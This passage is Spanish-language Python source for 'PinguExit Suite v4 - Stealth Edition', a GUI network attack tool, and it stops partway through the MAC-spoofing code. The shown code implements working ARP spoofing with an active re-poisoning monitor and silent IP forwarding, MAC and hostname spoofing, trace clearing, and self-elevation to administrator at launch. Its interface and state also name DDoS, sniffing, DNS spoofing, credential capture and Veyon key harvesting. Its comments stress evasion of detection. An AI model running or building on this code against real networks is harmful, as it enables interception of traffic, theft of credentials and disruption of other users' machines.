"""
PinguExit Suite v4 - Stealth Edition — Herramienta de red avanzada con CustomTkinter.
Técnicas de evasión mejoradas, gestión de claves Veyon, terminal global coloreada.
"""

import customtkinter as ctk
from tkinter import scrolledtext, messagebox, filedialog
import threading
import queue
import uuid
import time
import os
import glob
import socket
import random
import struct
import subprocess
import sys
import ctypes
import csv
import io
import http.server
import socketserver
import urllib.parse
try:
    import winreg
except ImportError:
    winreg = None

# ── Auto-elevación de privilegios al inicio ──
def _auto_elevate():
    """Si no somos admin en Windows, intentamos re-lanzar con runas."""
    try:
        if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
            params = ' '.join(f'"{a}"' for a in sys.argv)
            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            if ret > 32:  # Éxito: la nueva instancia elevada se ha lanzado
                sys.exit(0)
    except Exception:
        pass  # Si falla, continuar sin admin

_auto_elevate()

# ── Dependencias opcionales ──────────────────
SCAPY_OK = False
try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, ICMP,
        DNS, DNSQR, DNSRR,
        send, sendp, srp, sniff, Raw, conf
    )
    SCAPY_OK = True
except Exception:
    pass

PSUTIL_OK = False
try:
    import psutil
    PSUTIL_OK = True
except Exception:
    pass

# ── Tema global ──────────────────────────────
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

# ──────────────────────────────────────────────
#  HELPERS DE RED & SISTEMA
# ──────────────────────────────────────────────
def _is_admin():
    try:
        if os.name == 'nt':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.getuid() == 0
    except Exception:
        return False

def _mac_propia():
    node = uuid.getnode()
    return ':'.join(f'{(node >> i) & 0xff:02x}' for i in range(0, 48, 8))[::-1]

def _mac_aleatoria(oui=None):
    """MAC aleatoria. Si oui='apple' usa prefijos Apple reales para más sigilo."""
    ouis = {
        "apple":   ["a4:c3:f0","3c:22:fb","00:cd:fe","f0:18:98","8c:85:90"],
        "samsung": ["00:07:ab","00:12:fb","00:1d:25","70:f9:27","d8:57:ef"],
        "generic": [f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"],
    }
    base = random.choice(ouis.get(oui or "generic", ouis["generic"]))
    tail = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(3))
    return f"{base}:{tail}"

def _gateway():
    try:
        return conf.route.route("0.0.0.0")[2] if SCAPY_OK else "—"
    except Exception:
        return "—"

def _ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "127.0.0.1"

def _obtener_mac(ip, intentos=3):
    """ARP request con reintentos para mayor fiabilidad."""
    if not SCAPY_OK: return None
    for _ in range(intentos):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=1.5, verbose=0, retry=1)
            for _, r in ans:
                return r.hwsrc
        except Exception:
            pass
        time.sleep(0.3)
    return None

def _scan_rango(rango, timeout=3):
    """Escanea el rango ARP y devuelve lista de (ip, mac)."""
    if not SCAPY_OK: return []
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango),
                     timeout=timeout, verbose=0)
        return [(r.psrc, r.hwsrc) for _, r in ans]
    except Exception:
        return []

def _buscar_claves_pem(directorio=None):
    """Busca archivos .pem en directorios comunes de Veyon y el directorio del script."""
    dirs = [
        directorio or "",
        os.path.dirname(os.path.abspath(__file__)),
        r"C:\ProgramData\Veyon\keys",
        r"C:\Program Files\Veyon",
        os.path.expanduser("~"),
    ]
    claves = []
    for d in dirs:
        if d and os.path.isdir(d):
            claves.extend(glob.glob(os.path.join(d, "**", "*.pem"), recursive=True))
    # Eliminar duplicados conservando orden
    seen = set(); result = []
    for c in claves:
        if c not in seen:
            seen.add(c); result.append(c)
    return result

MAC      = _mac_propia()
GATEWAY  = _gateway()
IP_LOCAL = _ip_local()

# Directorio del script para buscar claves relativas
DIR_BASE = os.path.dirname(os.path.abspath(__file__))

# ── Estado global de hilos ───────────────────
_estado = {k: False for k in ("arp", "ddos", "sniff", "dns", "alerta")}
_dns_reglas: dict[str, str] = {}


# ──────────────────────────────────────────────
#  HELPERS DE LAYOUT  (reutilizables)
# ──────────────────────────────────────────────
def _pad(p, h=8):
    ctk.CTkFrame(p, height=h, fg_color="transparent").pack()

def _sep(p):
    ctk.CTkFrame(p, height=1, fg_color="#252525").pack(fill="x", pady=8)

def _btn_row(p, pady=6):
    f = ctk.CTkFrame(p, fg_color="transparent")
    f.pack(fill="x", pady=pady)
    return f

def _campo(parent, label, placeholder="", valor="", width=220):
    row = ctk.CTkFrame(parent, fg_color="transparent")
    row.pack(fill="x", pady=3)
    ctk.CTkLabel(row, text=label, width=170, anchor="w",
                 font=ctk.CTkFont(size=12)).pack(side="left")
    e = ctk.CTkEntry(row, width=width, placeholder_text=placeholder,
                     fg_color="#111111", border_color="#2a2a2a")
    if valor:
        e.insert(0, valor)
    e.pack(side="left")
    return e

def _out(parent, height=8):
    txt = scrolledtext.ScrolledText(
        parent, height=height,
        bg="#0a0a0a", fg="#b0bec5",
        insertbackground="#4fc3f7",
        font=("Consolas", 11),
        borderwidth=0, highlightthickness=0, relief="flat",
        selectbackground="#1565c0"
    )
    txt.pack(fill="both", expand=True, pady=(2, 4))
    return txt

# ──────────────────────────────────────────────
#  APLICACIÓN
# ──────────────────────────────────────────────
class PinguExit:
    # Colores de log
    COL = {
        "ok":    "#69f0ae",   # verde
        "warn":  "#ffca28",   # amarillo
        "err":   "#ff5252",   # rojo
        "info":  "#4fc3f7",   # azul claro
        "pkt":   "#ce93d8",   # lila
    }

    def __init__(self, root: ctk.CTk):
        self.root = root
        self.root.title("PinguExit Suite v4 - Stealth Edition")
        self.root.geometry("860x720")
        self.root.minsize(760, 600)
        self._claves_pem: list[str] = []
        self._clave_sel: str | None = None
        # Colas para batching de mensajes (evita saturar el event loop)
        self._log_q: queue.Queue    = queue.Queue()
        self._write_q: dict         = {}   # widget_id -> (widget, [mensajes])
        self._write_lock             = threading.Lock()
        self._sniff_n                = 0
        self._sniff_n_ui             = 0
        
        # Inicialización de atributos dinámicos construidos por layout
        self.nb = None
        self.consola = None
        self.arp_ip = None
        self.arp_gw = None
        self.arp_int = None
        self.arp_stealth = None
        self.arp_jitter = None
        self.arp_oui_var = None
        self.arp_start_btn = None
        self.arp_stop_btn = None
        self.arp_out = None
        self.mac_iface = None
        self.mac_nueva = None
        self.mac_oui = None
        self.mac_out = None
        self.scan_rango = None
        self.scan_timeout = None
        self.scan_btn = None
        self.scan_out = None
        self.ddos_ip = None
        self.ddos_pto = None
        self.ddos_modo = None
        self.ddos_start_btn = None
        self.ddos_stop_btn = None
        self.ddos_out = None
        self.sniff_filtro = None
        self.sniff_start_btn = None
        self.sniff_stop_btn = None
        self.sniff_count = None
        self.sniff_out = None
        self.dns_dom = None
        self.dns_falsa = None
        self.dns_reglas_box = None
        self.dns_start_btn = None
        self.dns_stop_btn = None
        self.dns_out = None
        # Captura de credenciales
        self._cap_server: socketserver.TCPServer | None = None
        self._cap_server_thread: threading.Thread | None = None
        self.cap_out = None
        self.cap_server_btn = None
        self.cap_stop_btn = None
        self.cap_moodle_btn = None
        self.vey_clave_var = None
        self.vey_clave_menu = None
        self.vey_out = None
        self.wol_mac = None
        self.ghost_hostname = None
        self.ghost_out = None

        self._ui()
        # Iniciar el bucle de vaciado de colas (cada 80ms)
        self._flush_loop()
        # Cargar claves al inicio
        self.root.after(600, self._vey_recargar_claves)

    def _write(self, widget, text):
        """Escribe en un widget de texto usando batching (cola)."""
        wid = id(widget)
        with self._write_lock:
            if wid not in self._write_q:
                self._write_q[wid] = (widget, [])
            self._write_q[wid][1].append(text)

    # ── Layout principal ──────────────────────
    def _ui(self):
        # Barra superior
        top = ctk.CTkFrame(self.root, height=46, corner_radius=0, fg_color="#080808")
        top.pack(fill="x"); top.pack_propagate(False)

        ctk.CTkLabel(top, text=" ⚡ PinguExit Suite v4 - Stealth Edition",
                     font=ctk.CTkFont(size=18, weight="bold"),
                     text_color="#4fc3f7").pack(side="left", padx=12)

        right_frame = ctk.CTkFrame(top, fg_color="transparent")
        right_frame.pack(side="right", fill="y")
        
        if not _is_admin():
            self._btn(right_frame, "🛡️ Reiniciar como Admin", self._restart_admin, "#b71c1c", width=140, height=28).pack(side="left", padx=(0, 15), pady=9)
                     
        ctk.CTkLabel(right_frame,
                     text=f"GW: {GATEWAY}   IP: {IP_LOCAL}   MAC: {MAC}",
                     font=ctk.CTkFont(size=10), text_color="#3a3a3a"
                     ).pack(side="left", padx=14)

        # Pestañas
        self.nb = ctk.CTkTabview(
            self.root, corner_radius=8,
            fg_color="#141414",
            segmented_button_fg_color="#0d0d0d",
            segmented_button_selected_color="#0d47a1",
            segmented_button_unselected_color="#0d0d0d",
            segmented_button_selected_hover_color="#1565c0",
            text_color="#9e9e9e",
            text_color_disabled="#444444",
        )
        self.nb.pack(fill="both", expand=True, padx=12, pady=(8, 0))

        tabs = [
            ("👻 GHOST",        self._build_ghost),
            ("⚡ ARP",          self._build_arp),
            ("🎭 MAC",          self._build_mac),
            ("🔍 Escáner",      self._build_scanner),
            ("💥 DDoS",         self._build_ddos),
            ("📡 Sniffer",      self._build_sniffer),
            ("🌐 DNS/CAPTURA",  self._build_dns),
            ("🖥 Veyon",        self._build_veyon),
        ]
        for nombre, fn in tabs:
            self.nb.add(nombre)
            fn(self.nb.tab(nombre))

        # ── Consola global coloreada ──────────
        bar = ctk.CTkFrame(self.root, height=24, corner_radius=0, fg_color="#0d0d0d")
        bar.pack(fill="x"); bar.pack_propagate(False)
        ctk.CTkLabel(bar, text=" REGISTRO GLOBAL",
                     font=ctk.CTkFont(size=10, weight="bold"),
                     text_color="#3a3a3a").pack(side="left", padx=8)
        ctk.CTkButton(bar, text="Limpiar", width=60, height=18,
                      font=ctk.CTkFont(size=10),
                      fg_color="#1a1a1a", hover_color="#252525",
                      command=lambda: self.consola.delete("1.0", "end")
                      ).pack(side="right", padx=8, pady=3)

        self.consola = scrolledtext.ScrolledText(
            self.root, height=8,
            bg="#080808", fg="#4fc3f7",
            insertbackground="white",
            font=("Consolas", 11),
            borderwidth=0, highlightthickness=0, relief="flat",
            selectbackground="#1565c0"
        )
        self.consola.pack(fill="x", padx=12, pady=(0, 10))

        # Tags de color para la consola
        for tag, color in self.COL.items():
            self.consola.tag_config(tag, foreground=color)

        self._log("[*] PinguExit v4 Stealth Edition listo.", "ok")
        if not _is_admin():
            self._log("[!] ATENCIÓN: Funciones ocultas desactivadas sin modo Administrador.", "warn")
        if not SCAPY_OK:
            self._log("[!] Scapy no disponible — instala Npcap: https://npcap.com/#download", "err")

    # ── Bucle de vaciado de colas ────────────
    def _flush_loop(self):
        """Vacía colas de mensajes en la UI cada 80ms (sin saturar el event loop)."""
        # Vaciar cola de log global
        batch = []
        try:
            while not self._log_q.empty():
                batch.append(self._log_q.get_nowait())
                if len(batch) >= 40:   # máximo 40 líneas por ciclo
                    break
        except queue.Empty:
            pass
        if batch:
            for ts, msg, tipo in batch:
                self.consola.insert("end", f"[{ts}] ", "info")
                self.consola.insert("end", msg + "\n", tipo)
            self.consola.see("end")

        # Vaciar colas de widgets individuales (_write)
        with self._write_lock:
            snapshot = list(self._write_q.items())
            self._write_q.clear()
        for wid, (widget, msgs) in snapshot:
            try:
                texto = "".join(msgs)
                widget.insert("end", texto)
                widget.see("end")
            except Exception:
                pass

        # Actualizar contador de paquetes si cambió
        if self._sniff_n != self._sniff_n_ui:
            self._sniff_n_ui = self._sniff_n
            try: self.sniff_count.configure(text=f"{self._sniff_n_ui} pkts")
            except Exception: pass

        self.root.after(80, self._flush_loop)

    # ── Log coloreado ─────────────────────────
    def _log(self, msg: str, tipo: str = "info"):
        ts = time.strftime("%H:%M:%S")
        self._log_q.put((ts, msg, tipo))

    def _npcap_warn(self):
        messagebox.showerror("Npcap/Scapy requerido",
            "Scapy o Npcap no están instalados.\n\n"
            "1) Ejecuta en consola: pip install scapy\n"
            "2) Descarga Npcap: https://npcap.com/#download\n"
            "   (Activa 'WinPcap API-compatible mode' al instalar).",
            parent=self.root)

    # ── Botón estándar ────────────────────────
    def _btn(self, parent, text, cmd, color="#1565c0", **kw):
        def _dark(h):
            try:
                r,g,b = int(h[1:3],16), int(h[3:5],16), int(h[5:7],16)
                return f"#{max(r-35,0):02x}{max(g-35,0):02x}{max(b-35,0):02x}"
            except Exception: return h
        
        height = kw.pop("height", 34)
        corner_radius = kw.pop("corner_radius", 7)
        
        return ctk.CTkButton(parent, text=text, fg_color=color,
                             hover_color=_dark(color),
                             font=ctk.CTkFont(size=12, weight="bold"),
                             height=height, corner_radius=corner_radius, command=cmd, **kw)

    # ════════════════════════════════════════════
    #  TAB 0 — GHOST
    # ════════════════════════════════════════════
    def _build_ghost(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="GHOST — Ocultación y Evasión Avanzada",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))
                     
        self.ghost_hostname = _campo(p, "Nuevo Hostname:", "Ej: DESKTOP-X1Y2Z3")
        
        bf = _btn_row(p)
        self._btn(bf, "🎭 Spoofear Hostname", self._ghost_spoof_hostname, "#e65100").pack(side="left", padx=(0,10))
        self._btn(bf, "🐧 Emular TTL (Linux)", self._ghost_emulate_ttl, "#2e7d32").pack(side="left", padx=(0,10))
        self._btn(bf, "🧹 Limpiar Rastros Red", self._ghost_clean_traces, "#b71c1c").pack(side="left")

        _sep(p)
        self.ghost_out = _out(p, 10)

    def _ghost_spoof_hostname(self):
        nuevo_nombre = self.ghost_hostname.get().strip()
        if not nuevo_nombre:
            messagebox.showwarning("Aviso", "Introduce un nuevo nombre de host."); return
        if not _is_admin():
            self._write(self.ghost_out, "✗ ERROR: Se requieren privilegios de ADMINISTRADOR.\n")
            self._log("[GHOST] Error: Sin privilegios admin", "err"); return
            
        self._write(self.ghost_out, f"» Intentando cambiar hostname a '{nuevo_nombre}'...\n")
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "Hostname", 0, winreg.REG_SZ, nuevo_nombre)
                winreg.SetValueEx(key, "NV Hostname", 0, winreg.REG_SZ, nuevo_nombre)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName", 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "ComputerName", 0, winreg.REG_SZ, nuevo_nombre)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName", 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "ComputerName", 0, winreg.REG_SZ, nuevo_nombre)
            self._write(self.ghost_out, "✔ Hostname modificado en el registro. Requiere reinicio para tener efecto total.\n")
            self._log(f"[GHOST] Hostname → {nuevo_nombre}", "ok")
        except Exception as e:
            self._write(self.ghost_out, f"✗ Error Registro: {e}\n")
            self._log(f"[GHOST] Error Registro: {e}", "err")

    def _ghost_emulate_ttl(self):
        if not _is_admin():
            self._write(self.ghost_out, "✗ ERROR: Se requieren privilegios de ADMINISTRADOR.\n"); return
        self._write(self.ghost_out, "» Cambiando DefaultTTL a 64 (Emulación Linux)....\n")
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "DefaultTTL", 0, winreg.REG_DWORD, 64)
            self._write(self.ghost_out, "✔ TTL a 64 aplicado. Los escáneres te verán como Linux.\n")
            self._log("[GHOST] TTL → 64", "ok")
        except Exception as e:
            self._write(self.ghost_out, f"✗ Error Registro: {e}\n")

    def _ghost_clean_traces(self):
        self._write(self.ghost_out, "» Limpiando rastros de red globales...\n")
        self._log("[GHOST] Limpieza de rastros", "warn")
        threading.Thread(target=self._ghost_clean_traces_thread, daemon=True).start()

    def _ghost_clean_traces_thread(self):
        try:
            self._write(self.ghost_out, "  [+] Flush DNS...\n")
            subprocess.run(["ipconfig", "/flushdns"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if _is_admin():
                self._write(self.ghost_out, "  [+] Borrando tabla ARP...\n")
                subprocess.run(["arp", "-d", "*"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self._write(self.ghost_out, "  [+] Reiniciando NetBIOS...\n")
                subprocess.run(["nbtstat", "-R"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                self._write(self.ghost_out, "  [!] ARP/NetBIOS requieren ser Administrador. Se omite.\n")
                
            self._write(self.ghost_out, "✔ Limpieza completada.\n")
            self._log("[GHOST] Limpieza fina", "ok")
        except Exception as e:
            self._write(self.ghost_out, f"✗ Error limpiando: {e}\n")

    # ════════════════════════════════════════════
    #  TAB 1 — ARP SPOOFING  (con evasión mejorada)
    # ════════════════════════════════════════════
    def _build_arp(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="ARP Spoofing — Intercepción de tráfico",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        self.arp_ip  = _campo(p, "IP víctima:", "Ej: 192.168.1.50")
        self.arp_gw  = _campo(p, "Gateway (vacío=auto):", valor=GATEWAY)
        self.arp_int = _campo(p, "Intervalo base (s):", valor="2", width=80)

        # Opciones de evasión
        opts = ctk.CTkFrame(p, fg_color="#111111", corner_radius=6)
        opts.pack(fill="x", pady=6)
        ctk.CTkLabel(opts, text="  Opciones de evasión",
                     font=ctk.CTkFont(size=11, weight="bold"),
                     text_color="#455a64").pack(anchor="w", padx=8, pady=(6,2))

        orow = ctk.CTkFrame(opts, fg_color="transparent"); orow.pack(fill="x", pady=(0,8), padx=8)
        self.arp_stealth = ctk.BooleanVar(value=True)
        self.arp_jitter  = ctk.BooleanVar(value=True)
        self.arp_oui_var = ctk.StringVar(value="Ninguno")

        ctk.CTkSwitch(orow, text="Rate Limiting dinámico",
                      variable=self.arp_stealth,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,16))
        ctk.CTkSwitch(orow, text="Jitter aleatorio",
                      variable=self.arp_jitter,
                      font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,16))

        orow2 = ctk.CTkFrame(opts, fg_color="transparent"); orow2.pack(fill="x", pady=(0,8), padx=8)
        ctk.CTkLabel(orow2, text="Spoofear fabricante MAC:",
                     font=ctk.CTkFont(size=12)).pack(side="left", padx=(0,8))
        ctk.CTkOptionMenu(orow2, values=["Ninguno","Apple","Samsung","Genérico"],
                          variable=self.arp_oui_var, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        bf = _btn_row(p)
        self.arp_start_btn = self._btn(bf, "▶ Iniciar ARP Spoof", self._arp_start, "#c62828")
        self.arp_start_btn.pack(side="left", padx=(0,10))
        self.arp_stop_btn = self._btn(bf, "■ Detener + Restaurar", self._arp_stop, "#37474f")
        self.arp_stop_btn.configure(state="disabled"); self.arp_stop_btn.pack(side="left")

        _sep(p)
        self.arp_out = _out(p, 7)

    def _arp_start(self):
        if not SCAPY_OK: self._npcap_warn(); return
        ip = self.arp_ip.get().strip()
        if not ip: messagebox.showwarning("Aviso", "Introduce la IP de la víctima."); return
        _estado["arp"] = True
        self.arp_start_btn.configure(state="disabled", fg_color="#37474f")
        self.arp_stop_btn.configure(state="normal", fg_color="#c62828")
        self.arp_out.delete("1.0", "end")
        threading.Thread(target=self._arp_loop, args=(ip,), daemon=True).start()

    def _arp_stop(self):
        _estado["arp"] = False
        self.arp_start_btn.configure(state="normal", fg_color="#c62828")
        self.arp_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._write(self.arp_out, "● Deteniendo y restaurando ARP...\n")
        self._log("[ARP] Ataque detenido.", "warn")

    def _arp_loop(self, ip):
        gw   = self.arp_gw.get().strip() or GATEWAY
        oui  = self.arp_oui_var.get().lower()
        # Elegir MAC de ataque
        mac_src = _mac_aleatoria(oui if oui != "ninguno" else None) \
                  if oui != "ninguno" else MAC

        mac_obj = _obtener_mac(ip)
        if not mac_obj:
            self._write(self.arp_out, f"✗ No se obtuvo MAC de {ip}. ¿Npcap? ¿IP activa?\n")
            self._log(f"[ARP] Error: sin MAC para {ip}", "err")
            self.root.after(0, self._arp_stop); return

        self._write(self.arp_out, f"» Target:  {ip}  ({mac_obj})\n")
        self._write(self.arp_out, f"» Gateway: {gw}\n")
        self._write(self.arp_out, f"» MAC src: {mac_src}  [evasión: {oui}]\n")
        self._write(self.arp_out, "─" * 44 + "\n")
        self._log(f"[ARP] Iniciado → {ip} usando {mac_src}", "warn")

        try:
            # Encapsulamiento en Ether() ocultando la MAC real (Capa 2) para evitar rastreo y el salto de MAC mismatch en switches
            pkt_t = Ether(src=mac_src, dst=mac_obj) / ARP(pdst=ip, hwdst=mac_obj, psrc=gw, hwsrc=mac_src, op=2)
            # Como script.py: apuntamos capa hacia la puerta de enlace a hwdst=broadcast y MAC ofuscada
            pkt_g = Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip, hwsrc=mac_src, op=2)
            
            # Monitoreo activo para evitar recuperación de conexión:
            def _arp_monitor():
                def _react(p):
                    if not _estado["arp"]: return
                    if ARP in p and p[ARP].op == 1: # Si es "who-has"
                        # Si la víctima pregunta por el gateway, disparamos ráfaga
                        if p[ARP].psrc == ip and p[ARP].pdst == gw:
                            sendp(pkt_t, verbose=0, count=3)
                        # Si el gateway pregunta por la víctima, disparamos ráfaga
                        elif p[ARP].psrc == gw and p[ARP].pdst == ip:
                            sendp(pkt_g, verbose=0, count=3)
                try:
                    sniff(filter="arp", prn=_react, stop_filter=lambda _: not _estado["arp"], store=False)
                except:
                    pass

            threading.Thread(target=_arp_monitor, daemon=True).start()

            if _is_admin():
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_ALL_ACCESS) as k:
                        winreg.SetValueEx(k, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                    self._write(self.arp_out, "✔ IP Forwarding activado (modo oculto).\n")
                except Exception:
                    pass

            n = 0
            base_iv = float(self.arp_int.get() or 2)
            while _estado["arp"]:
                # Se envía en capa 2 con sendp para garantizar que el origen de la trama es la MAC falsificada (anti-rastreo)
                sendp(pkt_t, verbose=0)
                sendp(pkt_g, verbose=0)
                n += 2
                self._write(self.arp_out, f"  ↗ pkt #{n:4d} → {ip}\n")
                self._log(f"[ARP] #{n} pkts → {ip}", "pkt")

                # Intervalo con jitter
                if self.arp_stealth.get():
                    iv = random.uniform(base_iv * 0.6, base_iv * 1.8)
                elif self.arp_jitter.get():
                    iv = base_iv + random.uniform(-0.5, 0.5)
                else:
                    iv = base_iv
                time.sleep(max(0.5, iv))
        except RuntimeError as e:
            if "npcap" in str(e).lower() or "winpcap" in str(e).lower():
                self.root.after(0, self._npcap_warn)
            else:
                self._write(self.arp_out, f"✗ Error: {e}\n")
                self._log(f"[ARP] Error: {e}", "err")
        finally:
            if _is_admin():
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_ALL_ACCESS) as k:
                        winreg.SetValueEx(k, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
                except Exception:
                    pass
            # Restaurar
            self._write(self.arp_out, "⟳ Restaurando ARP en modo oculto...\n")
            mac_gw = _obtener_mac(gw)
            if mac_obj and mac_gw:
                # Restauración simulando el flujo natural, forjando el remitente de capa 2 para no revelar nuestra MAC
                rest_t = Ether(src=mac_gw, dst=mac_obj) / ARP(pdst=ip, hwdst=mac_obj, psrc=gw, hwsrc=mac_gw, op=2)
                # Ojo: script.py manda a broadcast (ff:ff:ff:ff:ff:ff) para restablecer. Lo usamos aquí también en Capa 2
                rest_g = Ether(src=mac_obj, dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip, hwsrc=mac_obj, op=2)
                
                sendp(rest_t, count=6, verbose=0)
                sendp(rest_g, count=6, verbose=0)
                self._write(self.arp_out, "✔ Tablas ARP restauradas de manera invisible.\n")
                self._log("[ARP] Tablas restauradas (modo oculto).", "ok")
            _estado["arp"] = False
            self.root.after(0, lambda: self.arp_start_btn.configure(state="normal", fg_color="#c62828"))
            self.root.after(0, lambda: self.arp_stop_btn.configure(state="disabled", fg_color="#37474f"))

    # ════════════════════════════════════════════
    #  TAB 2 — MAC SPOOFING
    # ════════════════════════════════════════════
    def _build_mac(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="MAC Spoofing — Cambio de identidad de red",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        self.mac_iface = _campo(p, "Interfaz:",
                                 valor="Ethernet" if os.name == "nt" else "eth0")
        self.mac_nueva = _campo(p, "Nueva MAC (manual/gen.):",
                                 placeholder="AA:BB:CC:DD:EE:FF")

        oui_row = ctk.CTkFrame(p, fg_color="transparent"); oui_row.pack(fill="x", pady=3)
        ctk.CTkLabel(oui_row, text="Generar MAC (Ejemplos):", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.mac_oui = ctk.StringVar(value="Aleatorio")
        ctk.CTkOptionMenu(oui_row, values=["Aleatorio","Apple","Samsung","Genérico"],
                          variable=self.mac_oui, width=130,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        def _generar_mac():
            oui = self.mac_oui.get().lower()
            nueva = _mac_aleatoria(oui if oui != "aleatorio" else None)
            self.mac_nueva.delete(0, "end")
            self.mac_nueva.insert(0, nueva.upper())

        self._btn(oui_row, "Generar", _generar_mac, "#2e7d32", width=70).pack(side="left", padx=10)

        bf = _btn_row(p)
        self._btn(bf, "Aplicar MAC", self._mac_aplicar, "#e65100").pack(side="left", padx=(0,10))
        self._btn(bf, "MAC propia", lambda: self._log(f"[MAC] Original: {MAC}", "info"), "#37474f").pack(side="left")

        _sep(p)
        self.mac_out = _out(p, 10)

    def _restart_admin(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1)
            self.root.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo elevar privilegios: {e}", parent=self.root)

    def _mac_aplicar(self):
        iface = self.mac_iface.get().strip()
        oui   = self.mac_oui.get().lower()
        nueva = (self.mac_nueva.get().strip() or _mac_aleatoria(oui if oui != "aleatorio" else None)).upper()
        self._write(self.mac_out, f"» Intentando cambiar MAC de {iface} → {nueva}\n")
        self._log(f"[MAC] Solicitado: {iface} → {nueva}", "warn")
        
        if not _is_admin():
            self._write(self.mac_out, "✗ ERROR: Se requieren privilegios de ADMINISTRADOR.\n")
            self._log("[MAC] Error: Sin privilegios admin", "err")
            return

        try:
            if os.name == "nt":
                self._mac_win_set(iface, nueva)
            else:
                subprocess.run(["ip","link","set",iface,"down"], check=True)
                subprocess.run(["ip","link","set",iface,"address",nueva], check=True)
                subprocess.run(["ip","link","set",iface,"up"], check=True)
                self._write(self.mac_out, f"✔ MAC cambiada a {nueva}\n")
                self._log(f"[MAC] ✔ {nueva}", "ok")
        except Exception as e:
            self._write(self.mac_out, f"✗ Error: {e}\n")
            self._log(f"[MAC] Error: {e}", "err")

    def _mac_win_set(self, iface_name, new_mac):
        """Genera y ejecuta un script de PowerShell para cambiar la MAC con InterfaceIndex."""
        clean_mac = new_mac.replace(":", "").replace("-", "").upper()
        if len(clean_mac) == 12:
            if clean_mac[1] not in ['2', '6', 'A', 'E', 'a', 'e']:
                clean_mac = clean_mac[0] + '2' + clean_mac[2:]
                self._write(self.mac_out, f"⚠ MAC ajustada a {clean_mac} por compatibilidad Windows.\n")

        ps = f"""
$ErrorActionPreference = 'SilentlyContinue'
$adap = Get-NetAdapter -Name "{iface_name}"
if (-not $adap) {{ $adap = Get-NetAdapter | Where-Object {{$_.InterfaceDescription -match "{iface_name}"}} | Select-Object -First 1 }}
if ($adap) {{
    $idx = $adap.InterfaceIndex
    Write-Output "IDX:$idx"
    $reg = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\*' | Where-Object {{$_.DriverDesc -eq $adap.InterfaceDescription}} | Select-Object -First 1
    if ($reg) {{
        Set-ItemProperty -Path $reg.PSPath -Name "NetworkAddress" -Value "{clean_mac}"
        Disable-NetAdapter -Name $adap.Name -Confirm:$false
        Enable-NetAdapter -Name $adap.Name -Confirm:$false
        Write-Output "EXITO"
    }} else {{ Write-Output "FALLO_REG" }}
}} else {{ Write-Output "FALLO_ADAP" }}
"""
        creationflags = 0
        if hasattr(subprocess, 'CREATE_NO_WINDOW'):
            creationflags = subprocess.CREATE_NO_WINDOW
        try:
            proc = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                  capture_output=True, text=True, creationflags=creationflags)
            out = proc.stdout
            if "EXITO" in out:
